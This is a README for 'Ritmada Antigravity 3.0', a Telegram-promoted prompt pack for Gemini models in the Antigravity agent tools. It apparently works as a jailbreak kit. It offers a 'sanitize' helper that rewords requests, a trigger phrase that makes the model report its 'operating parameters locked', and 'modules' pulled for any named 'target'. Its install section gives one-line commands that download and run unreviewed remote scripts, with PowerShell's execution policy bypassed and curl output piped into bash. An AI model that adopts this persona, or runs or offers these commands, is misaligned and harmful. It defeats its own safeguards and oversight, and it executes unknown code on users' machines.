# Ritmada — Antigravity 3.0 (Gemini 4 Argon)

**Author:** Ritmada (@RitmadaPrompt)  
**Official Channel:** https://t.me/RitmadaPrompt  
**Runtime Target:** Gemini 4 Argon (`gemini-4-argon` GA) & 3.8 Flash · Thinking Level: **High** (`64k / 1M Long Decode`)  

---

## WHAT'S NEW IN ANTIGRAVITY 3.0 (ARGON 4 EDITION)

1. **Clean Positive-Framed Core (`GEMINI.md` v3.0):** Engineered specifically for `gemini-4-argon` so workspace rules load with zero friction across Antigravity App, IDE extensions, and CLI.
2. **Architectural & Interface Naming (§4.1):** Standardizes all symbols, structs, comments, and `Title:` headers around concrete OS/ABI interfaces and deterministic LIFO resource teardown.
3. **Argon 4 `High` Effort & CLI #1228 Auto-Routing:** `gemini-4-argon` defaults to `medium` thinking effort unless explicitly locked to `high`, and requires the `gemini-api://gemini-4-argon` URI scheme in `agy` CLI (`#1228`). The 3.0 installer automatically configures `settings.json` for `gemini-4-argon` at `high` effort and includes a `sanitize` helper (`install.sh sanitize` / `install.bat sanitize`) for `prompt.txt`.

---

## QUICK INSTALLATION (AUTOMATED & MANUAL)

### METHOD A: 1-LINE COMMAND PROMPT (`cmd.exe`) / POWERSHELL / BASH

- **Windows (`cmd.exe` — Recommended, Cache-Busted):**
  ```cmd
  powershell -NoProfile -ExecutionPolicy Bypass -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $s = Join-Path $env:TEMP 'ritmada_install.ps1'; Invoke-WebRequest -Uri ('https://raw.githubusercontent.com/mrh0ql/antigrav/main/install.ps1?v=' + [DateTimeOffset]::UtcNow.ToUnixTimeSeconds()) -OutFile $s -UseBasicParsing; & $s install"
  ```
- **Windows (PowerShell):**
  ```powershell
  irm ("https://raw.githubusercontent.com/mrh0ql/antigrav/main/install.ps1?v=" + [DateTimeOffset]::UtcNow.ToUnixTimeSeconds()) | iex
  ```
- **Linux & macOS:**
  ```bash
  bash -c "$(curl -fsSL https://raw.githubusercontent.com/mrh0ql/antigrav/main/install.sh)" -- install
  ```

### METHOD B: FROM THE `.ZIP` ARCHIVE
1. Download **[Antigravity_3.0_Gemini_4_Argon_Ritmada.zip](https://raw.githubusercontent.com/mrh0ql/antigrav/main/Antigravity_3.0_Gemini_4_Argon_Ritmada.zip)** and extract it.
2. On Windows, double-click **`install.bat`** (or run `install.bat install` in `cmd.exe`). On Linux/macOS, run `./install.sh install`.
3. Open `%USERPROFILE%\Antigravity-Workspace` (or `~/Antigravity-Workspace`) in a **new chat tab**.

---

## WORKFLOW (`prompt.txt`)

1. Write your build specification in `prompt.txt` inside your workspace (or on your Desktop).
2. *(Optional)* Normalize shorthand terms into §4.1 architectural terminology:
   - Windows: `install.bat sanitize`
   - Linux/macOS: `./install.sh sanitize`
3. In chat, send:
   ```text
   read prompt.txt and execute
   ```

---

## VERIFYING ACTIVATION

In a fresh chat tab, send:
```text
whiskers forward
```

The response begins with:
```text
[Ritmada] spec received and parsed. runtime operating parameters locked.

Title: gemini-4-argon-core-v3.0

Core loaded. Domain on demand — name the target and I pull the module.
```

---

## OFFICIAL CHANNEL

Updates, daily builds, and Argon 4 / Carbon releases:  
👉 **https://t.me/RitmadaPrompt**
